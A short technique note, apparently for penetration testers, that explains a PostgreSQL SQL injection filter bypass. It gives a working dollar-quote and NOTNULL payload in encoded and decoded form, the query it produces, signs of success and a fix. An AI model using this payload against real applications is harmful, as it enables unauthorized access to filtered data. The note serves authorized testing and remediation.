# PostgreSQL Dollar-Quote NOTNULL Filter Bypass

## Context

Use this pattern only in authorized labs, owned apps, in-scope targets, or defensive verification.

This applies when:

- The backend is PostgreSQL.
- User input reaches SQL as an expression.
- Spaces and single quotes are blocked.
- Letters, digits, `$`, and `-` are allowed.
- An earlier condition such as `published = true` must be bypassed.

## Payload Pattern

URL-encoded:

```text
%24a%240%24a%24OR-0-%24b%240%24b%24NOTNULL--
```

Decoded:

```text
$a$0$a$OR-0-$b$0$b$NOTNULL--
```

## Example Query Shape

If the application builds:

```sql
WHERE published = true AND id = <input>
```

the payload aims to produce:

```sql
WHERE published = true AND id = $a$0$a$ OR -0 - $b$0$b$ NOTNULL--
```

Equivalent logic:

```sql
(published = true AND id = '0') OR ((-0 - '0') IS NOT NULL)
```

## Why It Works

PostgreSQL dollar-quoted strings create string literals without single quotes:

```text
$tag$value$tag$
```

The end of the dollar-quoted string creates a token boundary, so `OR` can parse as a keyword even without a space.

`NOTNULL` avoids a space-separated `IS NOT NULL` expression.

## Expected Signal

- A control request for the hidden object ID fails.
- The payload request returns content outside the original filter.
- The response body changes in a way that proves authorization or visibility filtering was bypassed.

## Common Mistakes

- Starting with random `OR true--` payloads before identifying the parser context.
- Assuming blocked spaces means keywords cannot be introduced.
- Forgetting SQL precedence: `AND` binds tighter than `OR`.
- Treating a database error as a confirmed exploit instead of using it to refine the expression.

## Safe Fix

- Parameterize the query.
- Accept only a parsed integer ID before database access.
- Add negative tests where SQL expressions, keywords, and dollar-quoted strings must all fail.
